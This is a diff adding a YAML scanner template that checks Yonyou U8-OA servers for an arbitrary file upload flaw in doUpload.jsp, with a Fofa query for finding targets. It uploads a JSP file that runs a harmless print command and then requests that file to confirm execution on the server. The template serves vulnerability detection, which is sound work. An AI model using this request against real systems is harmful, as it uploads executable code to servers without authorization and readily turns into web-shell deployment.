@@ -1,0 +1,43 @@
+id: yonyou-u8-doupload-fileupload
+
+info:
+  name: 用友U8-OA doUpload.jsp 任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    Fofa: title="用友U8-OA"
+  reference:
+    - https://mp.weixin.qq.com/s/Vgpy61ogRhbMrRon6L714Q
+  tags: yonyou,fileupload
+  created: 2024/02/23
+
+set:
+  filename: randomLowercase(6)
+  rboundary: randomLowercase(8)
+  randbody: randomLowercase(38)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /yyoa/portal/tools/doUpload.jsp
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"iconFile\"; filename=\"{{filename}}.jsp\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <% out.println(\"{{randbody}}\"); %>\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'window.returnValue') && response.body.bcontains(b'window.close()')
+    output:
+      search: '"\"(?P<jspname>.*?).jsp\";".bsubmatch(response.body)'
+      jspname: search["jspname"]
+  r1:
+    request:
+      method: GET
+      path: /yyoa/portal/upload/{{jspname}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
